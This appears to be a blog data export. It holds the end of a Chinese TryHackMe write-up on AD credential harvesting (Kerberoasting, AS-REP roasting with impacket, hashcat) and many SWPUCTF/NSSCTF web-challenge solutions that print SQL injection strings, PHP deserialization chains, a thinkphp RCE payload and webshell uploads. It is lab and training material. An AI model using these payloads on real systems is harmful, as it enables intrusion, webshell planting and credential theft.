2/11/2338 11:05:2... 注意：在实际的AD环境中，LAPS仅会在特定的计算机上被启用；因此，我们需要枚举并找到正确的目标计算机以及正确的用户帐户，以便能够获取LAPS中的密码。在本小节的实验练习中，我们可以使用目标机器上C:\\Tool目录中的LAPSToolkit脚本来解决相关的枚举问题。 tips：在默认情况下，只有域管理员才能读取LAPS中的密码。 答题 PS C:\\&gt; Import-Module ActiveDirectory PS C:\\&gt; (Get-ADComputer $env:COMPUTERNAME -Properties *).DistinguishedName #获取目标机信息 PS C:\\&gt; Find-AdmPwdExtendedRights -Identity \"OU=THMorg,DC=thm,DC=red\" PS C:\\&gt; Get-AdmPwdPassword CREDS-HARVESTIN PS C:\\&gt; Get-ADGroupMember -Identity \"LAPsReader\" 0x09 其他AD凭据收集方式 在上文内容中，所假设的场景是我们已经拥有对目标系统的初始访问权限，并且将尝试从Windows操作系统的内存中或者各种敏感文件中获取凭据，而在其他情况下，我们还可以尝试针对目标网络执行某些攻击以获取相关凭据。 本小节将简要介绍一些可用于获取密码哈希的Windows攻击和AD攻击。在深入了解更多关于AD攻击的细节之前，建议先熟悉Kerberos协议和NTLM(新技术LAN管理器-New Technology LAN Manager)，这是一套用于对计算机用户进行身份验证的安全协议。 Kerberoasting攻击 Kerberoasting是一种常见的AD攻击，可用于获取AD票据，从而帮助攻击者实现权限维持。 为了有效地执行这种攻击，攻击者必须能够访问SPN(服务主体名称)帐户，如IIS用户、MSSQL等。Kerberoasting攻击主要涉及请求票据授予票据(TGT)和票据授予服务(TGS)，这种攻击的最终目标是实现权限提升和内网横向移动。 有关该攻击的更多详细信息，请尝试阅读以下博客内容： 【THM】Persisting Active Directory(AD域权限维持)-红队 现在让我们来快速演示一下此类攻击：首先，我们需要找到目标域控制器的一个SPN帐户，然后我们再发送请求以获得TGS票据。 如以下命令所示，我们将在攻击机上使用GetUserSPNs.py脚本来针对目标机器枚举SPN帐户。 tips：在本文的相关实验中，我们所针对的目标帐户是THM.red/thm，它的密码为Passw0rd!。 #枚举SPN帐户 #python3 /impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/thm python3 ./impacket/examples/GetUserSPNs.py -dc-ip 10.10.192.231 THM.red/thm #Password：Passw0rd! Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ---------------------------- ------- -------- -------------------------- --------- ---------- http/creds-harvestin.thm.red svc-thm 2022-06-10 17:47:33.796826 &lt;never&gt; 目标域控制器的服务主体名称(Service Principal Name-SPN)是：svc-thm 上面的命令很简单：我们只需要提供目标域控制器的IP地址和相关的domain name\\user name，然后GetUserSPNs脚本就会请求我们输入用户密码以检索我们所想要获取的信息。 上面的输出结果显示了一个名为svc-thm的SPN帐户，在找到该SPN用户之后，我们可以使用-request-user参数来发送单个请求，从而为srv-user用户获取TGS票据。 #请求一个作为SPN帐户的TGS票据 #此处可能需要修改攻击机上的host文件：10.10.192.231 THM.red svc-thm.THM.red python3.9 /opt/impacket/examples/GetUserSPNs.py -dc-ip MACHINE_IP THM.red/thm -request-user svc-thm python3 ./impacket/examples/GetUserSPNs.py -dc-ip 10.10.192.231 THM.red/thm -request-user svc-thm #Password：Passw0rd! 然后，我们就可以使用HashCat工具中的-m 13100模式来破解我们已经获取的TGS票据： #使用Hashcat破解TGS票据 vim spn.hash hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt 执行Kerberoasting攻击以获取TGS票据，然后破解TGS票据，我们最终得到的明文密码为：Passw0rd1 AS-REP Roasting攻击 AS-REP Roasting技术将使得攻击者能够检索帐户选项被设置为“不需要Kerberos预认证”的AD用户的密码哈希，此帐户选项依赖于旧的Kerberos身份验证协议，它能够允许在没有密码的情况下进行身份验证。一旦我们通过AS-REP Roasting技术获得用户的哈希值，我们就可以尝试进行离线破解，如果相关的哈希值是可破解的，那么我们就能够成功得到一个明文的用户密码。 在执行AS-REP Roasting之前，我们通常还需要执行枚举步骤以收集相关的目标域帐户列表，在本例中，我们将在攻击机中的TMP目录下创建一个现成的关于目标网络的域帐户列表-users.txt，下面是该列表的内容(在实际情况下该列表应该通过信息枚举获得)。 Administrator admin thm test sshd victim CREDS-HARVESTIN$ 注意：在本文相关的实验环境中存在配置了“不需要Kerberos预认证”的AD用户，因此我们能够尝试针对目标机器执行AS-REP Roasting。 接下来，我们将使用Impacket中的Get-NPUsers脚本，如下所示： #对目标用户列表执行AS-REP Roasting攻击 python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip MACHINE_IP thm.red/ -usersfile /tmp/users.txt python3 ./impacket/examples/GetNPUsers.py -dc-ip 10.10.192.231 thm.red/ -usersfile /tmp/users.txt 在上述命令中，我们使用了-dc-ip参数来指定目标域控制器的IP地址，并且为脚本提供了一个可供检查的域用户列表，一旦GetNPUsers.py脚本在执行时找到了没有Kerberos预认证配置的正确用户，那么此脚本就会为我们生成相关的票据。 我们可以使用Impacket GetNPUsers脚本的-format参数将票据导出为适配John或者hashcat的格式，然后再使用Rubeus和Hashcat等工具来尝试破解我们从目标Active Directory环境中所获取的TGTs。 有关AS-REP Roasting攻击的更多详细信息，请尝试阅读以下博客内容： 【THM】Attacktive Directory(AD域渗透基础)-练习 【THM】Attacking Kerberos(Kerberos渗透基础)-学习 SMB Relay Attack(SMB中继攻击) SMB Relay攻击的原理是滥用NTLM认证机制(NTLM质询-响应协议)，攻击者会通过执行中间人攻击来监控和捕获SMB报文并提取哈希值。为了使这种攻击生效，攻击者还必须确保目标机器的SMB签名已经被禁用，SMB签名是一种针对信息完整性的安全检查，可用于确保通信在受信任的源(客户端、服务端)之间进行。 有关SMB中继攻击的更多详细信息，请尝试阅读以下博客内容： 【THM】Exploiting Active Directory(利用AD域错误配置)-红队 LLMNR/NBNS投毒攻击 LLMNR (Link-Local Multicast Name Resolution-链路本地组播名称解析)和NBT-NS (NetBIOS Name Service-NetBIOS名称服务)可以帮助本地网络中的计算机在DNS查询失败时找到正确的机器；例如，假设某网络中的一台机器想要在没有现有的DNS记录的情况下进行通信(即DNS解析失败)，那么该机器就可以通过LLMNR或者NBT-NS向所有本地网络中的其他机器发送多播消息，以请求获取正确的地址。 LLMNR/NBNS投毒攻击发生在攻击者试图欺骗目标网络上的权威源，并使用主机标识服务对请求主机的链路本地多播名称解析(LLMNR)和NetBIOS名称服务(NBT-NS)的流量进行响应时。如果想了解更多有关此类攻击的信息，建议查看以下博客内容： 【THM】Breaching Active Directory(入侵活动目录)-红队 SMB中继攻击和LLMNR/NBNS投毒攻击的最终目标都是为了捕获目标用户用于身份验证的NTLM哈希，这有助于我们获得对于目标帐户或者目标机器的访问权限。 0x10 总结 在本文中，我们讨论了攻击者用于获取用户凭据的各种方法，包括从本地计算机和域控制器中获取凭据，总结如下： 我们讨论了如何访问Windows内存、转储LSASS进程并提取用于身份验证的哈希值。 我们讨论了Windows凭据管理器以及从中提取密码信息的方法。 我们介绍了Windows LAPS特性，并通过枚举它来找到正确的用户和目标从而尝试提取相关的密码信息。 我们介绍了能够用于实现转储和提取用户凭据的AD攻击。 以下工具可用于扫描目标计算机(探测文件、内存等)以查找敏感信息，建议在进行信息枚举时使用： Snaffler Seatbelt Lazagne","tags":["TryHackMe"],"categories":["TryHackMe"]},{"path":"/2024/03/03/swpuctf/","content":"[SWPUCTF 2021 新生赛]gift_F12 简单的js源码泄露 [SWPUCTF 2021 新生赛]jicao &lt;?php highlight_file('index.php'); include(\"flag.php\"); $id=$_POST['id']; $json=json_decode($_GET['json'],true); if ($id==\"wllmNB\"&amp;&amp;$json['x']==\"wllm\") {echo $flag;} ?&gt; 只需要id=wllmNB,随后get传参?json={\"x\":\"wllm\"} 但这里如果用bp的话，需要添加Content-Type: application/x-www-form-**urlencoded才可以 因为有post传参，因此必须进行url编码 [SWPUCTF 2021 新生赛]easy_md5 &lt;?php highlight_file(__FILE__); include 'flag2.php'; if (isset($_GET['name']) &amp;&amp; isset($_POST['password'])){ $name = $_GET['name']; $password = $_POST['password']; if ($name != $password &amp;&amp; md5($name) == md5($password)){ echo $flag; } else { echo \"wrong!\"; } } else { echo 'wrong!'; } ?&gt; wrong! [SWPUCTF 2021 新生赛]include 页面说让我们串file参数试试，传入之后知道是伪协议读取 &lt;?php ini_set(\"allow_url_include\",\"on\"); header(\"Content-type: text/html; charset=utf-8\"); error_reporting(0); $file=$_GET['file']; if(isset($file)){ show_source(__FILE__); echo 'flag 在flag.php中'; }else{ echo \"传入一个file试试\"; } echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; include_once($file); ?&gt; flag 在flag.php中 [SWPUCTF 2021 新生赛]easy_sql 简单SQL注入 ?wllm=-1' union select 1, group_concat(flag), 3 from test_tb--+ [SWPUCTF 2021 新生赛]easyrce [SWPUCTF 2021 新生赛]caidao RCE或者蚁剑连接 不过这里蚁剑连接时候总是报错，之后修改了编码方式才通过。不理解（被waf了？？？） [SWPUCTF 2021 新生赛]Do_you_know_http 第一个改UA头即可，第二个改IP为本地，302跳转即可 [第五空间 2021]WebFTP 不知道考什么，直接扫目录得到phpinfo.php，搜索flag即可 [SWPUCTF 2021 新生赛]babyrce &lt;?php error_reporting(0); highlight_file(__FILE__); error_reporting(0); if (isset($_GET['url'])) { $ip=$_GET['url']; if(preg_match(\"/ /\", $ip)){ die('nonono'); } $a = shell_exec($ip); echo $a; } ?&gt; [SWPUCTF 2021 新生赛]ez_unserialize &lt;?php error_reporting(0); show_source(\"cl45s.php\"); class wllm{ public $admin; public $passwd; public function __construct(){ $this-&gt;admin =\"user\"; $this-&gt;passwd = \"123456\"; } public function __destruct(){ if($this-&gt;admin === \"admin\" &amp;&amp; $this-&gt;passwd === \"ctf\"){ include(\"flag.php\"); echo $flag; }else{ echo $this-&gt;admin; echo $this-&gt;passwd; echo \"Just a bit more!\"; } } } $p = $_GET['p']; unserialize($p); ?&gt; 链子如下： &lt;?php class wllm{ public $admin; public $passwd; } $pop=new wllm(); $pop-&gt;admin = 'admin'; $pop-&gt;passwd = 'ctf'; echo urlencode(serialize($pop)); ?&gt; 这里放一个对上述构造函数以及反序列化的优先级解释（我感觉GPT回答没错） 在 PHP 的序列化中，如果在序列化字符串中指定了对象的属性值，那么在反序列化时，会使用这些指定的属性值来初始化对象，而不会调用构造函数。因此，在传入序列化字符串时，你可以这样指定 admin 和 passwd 的值： O:4:\"wllm\":2:{s:5:\"admin\";s:4:\"user\";s:6:\"passwd\";s:6:\"123456\";} 这里的优先级是序列化字符串中指定的属性值优先于构造函数中的默认值。反序列化时会使用这些指定的属性值来初始化对象的属性。 [SWPUCTF 2021 新生赛]easyupload2.0 这道题也是没想到，因为基本没见过（但确实基础。。。） 这里上传试了几次发现ban了php、ini、htaccess，我们可以考虑PHP文件其他的拓展名php3、php5、phtml、pht等我们一一尝试 找环境变量或者phpinfo都可 [SWPUCTF 2021 新生赛]easyupload1.0 发现修改为该MIME类型即可 [SWPUCTF 2021 新生赛]no_wakeup &lt;?php header(\"Content-type:text/html;charset=utf-8\"); error_reporting(0); show_source(\"class.php\"); class HaHaHa{ public $admin; public $passwd; public function __construct(){ $this-&gt;admin =\"user\"; $this-&gt;passwd = \"123456\"; } public function __wakeup(){ $this-&gt;passwd = sha1($this-&gt;passwd); } public function __destruct(){ if($this-&gt;admin === \"admin\" &amp;&amp; $this-&gt;passwd === \"wllm\"){ include(\"flag.php\"); echo $flag; }else{ echo $this-&gt;passwd; echo \"No wake up\"; } } } $Letmeseesee = $_GET['p']; unserialize($Letmeseesee); ?&gt; &lt;?php class HaHaHa{ public $admin; public $passwd; } $pop=new HaHaHa(); $pop-&gt;admin = 'admin'; $pop-&gt;passwd = 'wllm'; echo serialize($pop); ?&gt; O:6:\"HaHaHa\":6:{s:5:\"admin\";s:5:\"admin\";s:6:\"passwd\";s:4:\"wllm\";}//修改属性个数即可 [SWPUCTF 2021 新生赛]PseudoProtocols 看了提示才想到伪协议 &lt;?php ini_set(\"max_execution_time\", \"180\"); show_source(__FILE__); include('flag.php'); $a= $_GET[\"a\"]; if(isset($a)&amp;&amp;(file_get_contents($a,'r')) === 'I want flag'){ echo \"success \"; echo $flag; } ?&gt; 看到这种file_get_contents的用法，就是php://input，当然data协议也可 [SWPUCTF 2021 新生赛]easyupload3.0 可以看到允许htaccess上传 [SWPUCTF 2021 新生赛]hardrce &lt;?php header(\"Content-Type:text/html;charset=utf-8\"); error_reporting(0); highlight_file(__FILE__); if(isset($_GET['wllm'])) { $wllm = $_GET['wllm']; $blacklist = [' ','\\t','\\r',' ','\\+','\\[','\\^','\\]','\\\"','\\-','\\$','\\*','\\?','\\&lt;','\\&gt;','\\=','\\`',]; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $wllm)) { die(\"LTLT说不能用这些奇奇怪怪的符号哦！\"); }} if(preg_match('/[a-zA-Z]/is',$wllm)) { die(\"Ra's Al Ghul说不能用字母哦！\"); } echo \"NoVic4说：不错哦小伙子，可你能拿到flag吗？\"; eval($wllm); } else { echo \"蔡总说：注意审题！！！\"; } ?&gt; 蔡总说：注意审题！！！ 可以看到字母和大部分符号都过滤了，只能无字母RCE。可参考： 无字母数字绕过正则表达式总结（含上传临时文件、异或、或、取反、自增脚本） &lt;?php //在命令行中运行 /*author yu22x*/ fwrite(STDOUT,'[+]your function: '); $system=str_replace(array(\"\\r \", \"\\r\", \" \"), \"\", fgets(STDIN)); fwrite(STDOUT,'[+]your command: '); $command=str_replace(array(\"\\r \", \"\\r\", \" \"), \"\", fgets(STDIN)); echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');'; ?&gt; [SWPUCTF 2021 新生赛]error 简单的报错注入 ?id=1' and updatexml(1,concat(0x7e,substr((select flag from test_tb),15,30)),1)--+ [SWPUCTF 2021 新生赛]pop &lt;?php error_reporting(0); show_source(\"index.php\"); class w44m{ private $admin = 'aaa'; protected $passwd = '123456'; public function Getflag(){ if($this-&gt;admin === 'w44m' &amp;&amp; $this-&gt;passwd ==='08067'){ include('flag.php'); echo $flag; }else{ echo $this-&gt;admin; echo $this-&gt;passwd; echo 'nono'; } } } class w22m{ public $w00m; public function __destruct(){ echo $this-&gt;w00m; } } class w33m{ public $w00m; public $w22m; public function __toString(){ $this-&gt;w00m-&gt;{$this-&gt;w22m}(); return 0; } } $w00m = $_GET['w00m']; unserialize($w00m); ?&gt; &lt;?php class w44m{ private $admin = 'w44m'; protected $passwd = '08067'; } class w22m{ public $w00m; } class w33m{ public $w00m; public $w22m; } $pop = new w22m(); $pop-&gt;w00m = new w33m(); $pop-&gt;w00m-&gt;w00m = new w44m(); $pop-&gt;w00m-&gt;w22m = 'Getflag'; echo urlencode(serialize($pop)); ?&gt; 注意不可见字符的处理即可 [SWPUCTF 2021 新生赛]sql 这道题过滤了几个关键字 空格用/**/代替 =用like代替 --+中的+用%23代替 substr用mid代替 wllm=-1'/**/union/**/select/**/1,mid((concat(flag)),25,35),3/**/from/**/LTLT_flag%23 [SWPUCTF 2021 新生赛]finalrce &lt;?php highlight_file(__FILE__); if(isset($_GET['url'])) { $url=$_GET['url']; if(preg_match('/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\\-|\\*|\\\"|\\&gt;|\\&lt;|\\%|\\$/i',$url)) { echo \"Sorry,you can't use this.\"; } else { echo \"Can you see anything?\"; exec($url); } } 由于exec函数，那么是无回显的，这里可以用tee命令将内容重定向到文件，随后查看文件即可 l\\s /|tee 1.txt ?url=tac /flllll\\aaaaaaggggggg |tee 3.txt [SWPUCTF 2022 新生赛]ez_ez_php &lt;?php error_reporting(0); if (isset($_GET['file'])) { if ( substr($_GET[\"file\"], 0, 3) === \"php\" ) { echo \"Nice!!!\"; include($_GET[\"file\"]); } else { echo \"Hacker!!\"; } }else { highlight_file(__FILE__); } //flag.php 根据代码，很明显要求我们用PHP伪协议（这么明显？？） 然后提示flag在flag文件中 [SWPUCTF 2022 新生赛]ez_ez_php(revenge) &lt;?php error_reporting(0); if (isset($_GET['file'])) { if ( substr($_GET[\"file\"], 0, 3) === \"php\" ) { echo \"Nice!!!\"; include($_GET[\"file\"]); } else { echo \"Hacker!!\"; } }else { highlight_file(__FILE__); } //flag.php 不理解，一模一样，只不过flag换地方了。。。？？？？ [SWPUCTF 2022 新生赛]奇妙的MD5 这道题听脑洞，不会-》看wp 首先是信息搜集，发现http头有提示 也就是说大概率传一个字符，经过md5($pass, true)处理之后与前面的SQL语句拼接之后恒为true 这里我想不出来，看了wp发现有两种可能 一个算是万能绕过的字符：ffifdyop，根据函数md5加密后，再次转换为字符串时，会变成’or’6，此时函数一定为真。（具体内容可以查一查md5($pass,true)函数） 一个是 MD5 加密后弱比较等于自身，这个字符串是 0e215962017 md5($pass, true) 的含义是对 $pass 进行 MD5 哈希计算，其中第二个参数为 true，表示返回二进制结果，而不是十六进制字符串。通常情况下，MD5 哈希函数返回的是一个32个字符的十六进制字符串表示的哈希值，但如果传入 true 参数，则返回一个16字节的二进制字符串。 输入上述的字符串ffifdyop之后，到了第二个页面，找到部分源码 &lt;!-- $x= $GET['x']; $y = $_GET['y']; if($x != $y &amp;&amp; md5($x) == md5($y)){ ; -&gt; 数组绕过，之后到第三个页面，依旧是数组绕过 &lt;?php error_reporting(0); include \"flag.php\"; highlight_file(__FILE__); if($_POST['wqh']!==$_POST['dsy']&amp;&amp;md5($_POST['wqh'])===md5($_POST['dsy'])){ echo $FLAG; } [SWPUCTF 2022 新生赛]1z_unserialize &lt;?php class lyh{ public $url = 'NSSCTF.com'; public $lt; public $lly; function __destruct() { $a = $this-&gt;lt; $a($this-&gt;lly); } } unserialize($_POST['nss']); highlight_file(__FILE__); ?&gt; 简单的反序列化 &lt;?php class lyh{ public $url; public $lt = 'system'; public $lly = 'cat${IFS}/flag'; function __destruct() { $a = $this-&gt;lt; $a($this-&gt;lly); } } $pop = new lyh(); echo serialize($pop); ?&gt; //O:3:\"lyh\":3:{s:3:\"url\";N;s:2:\"lt\";s:6:\"system\";s:3:\"lly\";s:14:\"cat${IFS}/flag\";} [SWPUCTF 2022 新生赛]ez_rce 直接robots.txt找到对应路由，访问之后发现是thinkphp漏洞，直接payload打就行了 ?s=/Index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /nss/ctf/flag/flag [SWPUCTF 2022 新生赛]ez_ez_unserialize &lt;?php class X { public $x = __FILE__; function __construct($x) { $this-&gt;x = $x; } function __wakeup() { if ($this-&gt;x !== __FILE__) { $this-&gt;x = __FILE__; } } function __destruct() { highlight_file($this-&gt;x); //flag is in fllllllag.php } } if (isset($_REQUEST['x'])) { @unserialize($_REQUEST['x']); } else { highlight_file(__FILE__); } 简单的链子，绕过wakeup即可 &lt;?php class X { public $x = 'fllllllag.php'; } $pop = new X(); echo serialize($pop); ?&gt; //O:1:\"X\":1:{s:1:\"x\";s:13:\"fllllllag.php\";} // 改为 //O:1:\"X\":3:{s:1:\"x\";s:13:\"fllllllag.php\";} [SWPUCTF 2022 新生赛]where_am_i 这道题没想到是社工学，虽然知道11位大概率是电话号。。。这里昨晚才反应过来，题目也提示过（我在哪） 根据wp，这里有图片地址，直接百度识图看看 发现是成都山水间 古迹酒店，直接百度搜一手 [SWPUCTF 2022 新生赛]js_sign 又是一个新知识，敲击码：通信领域常用编码 ，看了一下感觉挺简单，就是对号入座，接下来看源码 解码得到：tapcode也就是tap code：敲击码，对应工具为：http://www.hiencode.com/tapcode.html 接着将flag的值，中间空格去掉，放进去解密即可：NSSCTF{youfindflagbytapcode} [SWPUCTF 2022 新生赛]xff 修改xff以及referer头即可 [SWPUCTF 2022 新生赛]numgame 发现查看源码、F12什么的都禁了，直接上bp抓一下 发现多个可以js文件，访问一下，以为是flag，解码看看：NsScTf.php 访问页面 &lt;?php error_reporting(0); //hint: 与get相似的另一种请求协议是什么呢 include(\"flag.php\"); class nss{ static function ctf(){ include(\"./hint2.php\"); } } if(isset($_GET['p'])){ if (preg_match(\"/n|c/m\",$_GET['p'], $matches)) die(\"no\"); call_user_func($_GET['p']); }else{ highlight_file(__FILE__); } 这道题感觉有点脑洞了，我想不到。。。这里第二个提示为：有没有可能类是nss2呢。 这里重点函数肯定是call_user_func了，搜一下用法 当然也可以看这个 也就是说我们可以通过这个函数调用某些方法，结合他说真正的类是nss2，而nss类中有一个ctf方法，那我们可以尝试 nss2::ctf，当然再结合第一个提示说：与get类似的传参方式是什么呢？肯定是post了，说明需要post传参p 最后查看源码即可 [SWPUCTF 2022 新生赛]ez_sql 刚开始说让我们用相对安全的传参方式：肯定是post，接着我给nss随便传了个内容，发现两个fake flag。。。。 接着就是常规SQL手工注入了，这里不断fuzz发现过滤了order、union、空格，不过都可以双写绕过，后面的用内联注释绕过即可 nss=2'/**/uunionnion/**/select/**/1,database(),3# nss=2'/**/uunionnion/**/select/**/1,group_concat(table_name),3/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema='NSS_db'# nss=2'/**/uunionnion/**/select/**/1,group_concat(column_name),3/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='NSS_tb'# nss=2'/**/uunionnion/**/select/**/1,group_concat(Secr3t),3/**/from/**/NSS_tb# [SWPUCTF 2022 新生赛]webdog1__start 看到源码有这一处地方，要求md5加密后等于自身，那找一个0e开头的字符串即可：?web=0e215962017 接着继续看源码，箭头处可以联想到robots.txt 继续访问，看到响应包的提示，继续访问 &lt;?php error_reporting(0); highlight_file(__FILE__); if (isset($_GET['get'])){ $get=$_GET['get']; if(!strstr($get,\" \")){ $get = str_ireplace(\"flag\", \" \", $get); if (strlen($get)&gt;18){ die(\"This is too long.\"); } else{ eval($get); } }else { die(\"nonono\"); } } ?&gt; ?get=eval($_POST[a]); //post a=system('cat /flag'); //也可以直接 system(\"nl%09/*\"); [SWPUCTF 2022 新生赛]funny_php &lt;?php session_start(); highlight_file(__FILE__); if(isset($_GET['num'])){ if(strlen($_GET['num'])&lt;=3&amp;&amp;$_GET['num']&gt;999999999){ echo \":D\"; $_SESSION['L1'] = 1; }else{ echo \":C\"; } } if(isset($_GET['str'])){ $str = preg_replace('/NSSCTF/',\"\",$_GET['str']); if($str === \"NSSCTF\"){ echo \"wow\"; $_SESSION['L2'] = 1; }else{ echo $str; } } if(isset($_POST['md5_1'])&amp;&amp;isset($_POST['md5_2'])){ if($_POST['md5_1']!==$_POST['md5_2']&amp;&amp;md5($_POST['md5_1'])==md5($_POST['md5_2'])){ echo \"Nice!\"; if(isset($_POST['md5_1'])&amp;&amp;isset($_POST['md5_2'])){ if(is_string($_POST['md5_1'])&amp;&amp;is_string($_POST['md5_2'])){ echo \"yoxi!\"; $_SESSION['L3'] = 1; }else{ echo \"X(\"; } } }else{ echo \"G\"; echo $_POST['md5_1'].\" \".$_POST['md5_2']; } } if(isset($_SESSION['L1'])&amp;&amp;isset($_SESSION['L2'])&amp;&amp;isset($_SESSION['L3'])){ include('flag.php'); echo $flag; } ?&gt; 第一个指数绕过、第二个双写绕过、第三个找字符串在md5加密后0e开头的即可 ?num=9e9&amp;str=NSSNSSCTFCTF md5_1=s878926199a&amp;md5_2=s155964671a [SWPUCTF 2021 新生赛]hardrce_3 &lt;?php header(\"Content-Type:text/html;charset=utf-8\"); error_reporting(0); highlight_file(__FILE__); if(isset($_GET['wllm'])) { $wllm = $_GET['wllm']; $blacklist = [' ','\\^','\\~','\\|']; foreach ($blacklist as $blackitem) { if (preg_match('/' . $blackitem . '/m', $wllm)) { die(\"小伙子只会异或和取反？不好意思哦LTLT说不能用！！\"); }} if(preg_match('/[a-zA-Z0-9]/is',$wllm)) { die(\"Ra'sAlGhul说用字母数字是没有灵魂的！\"); } echo \"NoVic4说：不错哦小伙子，可你能拿到flag吗？\"; eval($wllm); } else { echo \"蔡总说：注意审题！！！\"; } ?&gt; NoVic4说：不错哦小伙子，可你能拿到flag吗？ 这里吧取反、异或都过滤了，但我们可以用自增，固定格式如下： $_=[];$_=@\"$_\";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]); 这是固定格式构造出来的 assert($_POST[_]); 然后post传入 _=phpinfo(); 使用时需要url编码. 可以看到过滤了很多命令执行函数，但没有过滤file_put_contents函数，我们直接写马即可 _=file_put_contents('shell.php','&lt;?php @eval($_POST[1]);?&gt;'); 之后蚁剑连接（这里开始一直报错，不知道为何，也不是代理啥的问题，结果等了一会儿突然又行了） 不过这里也可以用其他办法，但如果不是上述令写马的方式，则需要绕过disable_funtions限制 也可以用下面的绕过open_basedir的方法 &lt;?php mkdir('sub');chdir('sub');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/'));?&gt; //列举根目录 &lt;?php mkdir('test'); chdir('test'); ini_set('open_basedir','..'); chdir('..'); chdir('..'); chdir('..'); ini_set('open_basedir','/'); echo file_get_contents('/flag');?&gt;//拿到flag [SWPUCTF 2022 新生赛]ez_1zpop &lt;?php error_reporting(0); class dxg { function fmm() { return \"nonono\"; } } class lt { public $impo='hi'; public $md51='weclome'; public $md52='to NSS'; function __construct() { $this-&gt;impo = new dxg; } function __wakeup() { $this-&gt;impo = new dxg; return $this-&gt;impo-&gt;fmm(); } function __toString() { if (isset($this-&gt;impo) &amp;&amp; md5($this-&gt;md51) == md5($this-&gt;md52) &amp;&amp; $this-&gt;md51 != $this-&gt;md52) return $this-&gt;impo-&gt;fmm(); } function __destruct() { echo $this; } } class fin { public $a; public $url = 'https://www.ctfer.vip'; public $title; function fmm() { $b = $this-&gt;a; $b($this-&gt;title); } } if (isset($_GET['NSS'])) { $Data = unserialize($_GET['NSS']); } else { highlight_file(__file__); } 简单的链子 &lt;?php class dxg { } class lt { public $impo; public $md51; public $md52; } class fin { public $a; public $url; public $title; } $pop = new lt(); $pop-&gt;impo = new fin(); $pop-&gt;md51 = 'QNKCDZO'; $pop-&gt;md52 = '240610708'; $pop-&gt;impo-&gt;a = 'system'; $pop-&gt;impo-&gt;title = 'ls /'; echo serialize($pop); ?&gt; [SWPUCTF 2022 新生赛]funny_web 这里提示账户是实验室名字：NSS，密码是群里某位成员的QQ，管理员全尝试一次就行了：2122693401 &lt;?php error_reporting(0); header(\"Content-Type: text/html;charset=utf-8\"); highlight_file(__FILE__); include('flag.php'); if (isset($_GET['num'])) { $num = $_GET['num']; if ($num != '12345') { if (intval($num) == '12345') { echo $FLAG; } } else { echo \"这为何相等又不相等\"; } } 简单的PHP特性，可以换进制绕过、小数点、数学计算法、二次取反等等：12345a [SWPUCTF 2022 新生赛]Ez_upload 文件上传，这里是过滤了php后缀的ph，那畸形后缀名绕过就别想了。之后上传正常的jpg发现还是不对，就尴尬了，我寻思都很正常，看了wp发现，那个提示就是单纯的检测文件内容而已。搞得我有点晕 这里的其他类型我以为就是mime的类型不对或者是后缀被过滤了。也反映出来分析文件上传的思路就不行，且上传正常jpg就应该注意内容的正常与否，需要一步步排除，不让就如同我一样，不知道过滤了什么 这里更换正常内容，就成功上传，显然就是利用.htaccess文件了，但又限制文件内容，翻一下笔记 正好，那直接上就对了 AddType application/x-httpd-php .bcx 先成功让其解析bcx文件，接着上传 &lt;script language=\"php\"&gt;eval($_POST[1]);&lt;/script&gt; 上传后，发现flag在env中 [SWPUCTF 2023 秋季新生赛]If_else 某一天,NSSCTF给了你一次机会,让你来自定义if中的条件,提交后访问check.php查看结果 提交方式$_POST[\"check\"] 记得访问一下check.php哦~ check.php的内容 &lt;?php $a=false; $b=false; if(你提交的部分将会被写至这里) {$a=true;} else {$b=true;} if($a===true&amp;&amp;$b===true) eval(system(cat /flag)); ?&gt; 这里分析一波就可以知道，根本不可能绕过if语句，我也是陷误区了，当时还想着是否可以闭合来执行命令，但没成功，看了wp才知道我构造就错了。两种方法： 一个是if条件里面通过eval直接就可以执行命令，且能回显出来？？？这里有点不懂，先记下来吧 check=eval(system('cat /flag')) 一个是通过闭合：check=1) eval(system(‘cat /flag’));/* 这里我当时没成功就是用的是//，这种只能注释一行，显然不行 [SWPUCTF 2021 新生赛]babyunser 这里刚开始给了上传文件与读取文件功能。因为他直接将文件后缀改为了 txt，webshell就别想了，尝试了半天，我突然想到目录穿越，不过过滤了…/，之后又想到伪协议，幸运地是file没过滤，直接就能读取到主目录下的文件了 读取了read.php与upload.php发现还存在class.php，代码如下 class aa{ public $name; public function __construct(){ $this-&gt;name='aa'; } public function __destruct(){ 